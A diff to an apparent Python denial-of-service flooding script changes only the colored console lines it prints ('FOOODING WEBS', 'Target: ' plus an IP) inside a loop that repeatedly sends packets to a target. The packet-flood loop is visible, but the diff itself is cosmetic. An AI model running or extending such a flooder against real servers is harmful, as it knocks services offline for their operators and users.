@@ -92,9 +92,13 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m" +str(u)+ "] \033[32m[FOOODING WEBS]  \033[34mTarget: " +ip+ "  \033[0m")
-        print("\033[95m_______________________________________________________|\033[0m")
-     except:
+        print("\033[92m[" +str(u)+ "] \033[32m[FOOODING WEBS]  \033[97mTarget: " +ip+ "  \033[0m")
+        print("\033[93m[" +str(u)+ "] \033[33m[FOOODING WEBS]  \033[92mTarget: " +ip+ "  \033[0m")
+        print("\033[94m[" +str(u)+ "] \033[34m[FOOODING WEBS]  \033[93mTarget: " +ip+ "  \033[0m")
+        print("\033[95m[" +str(u)+ "] \033[35m[FOOODING WEBS]  \033[36mTarget: " +ip+ "  \033[0m")
+        print("\033[96m[" +str(u)+ "] \033[36m[FOOODING WEBS]  \033[31mTarget: " +ip+ "  \033[0m")
+        
+    except:
         s.close()
         print("\033[97m[💥\033[97m] \033[97mמציפים למטה")
         
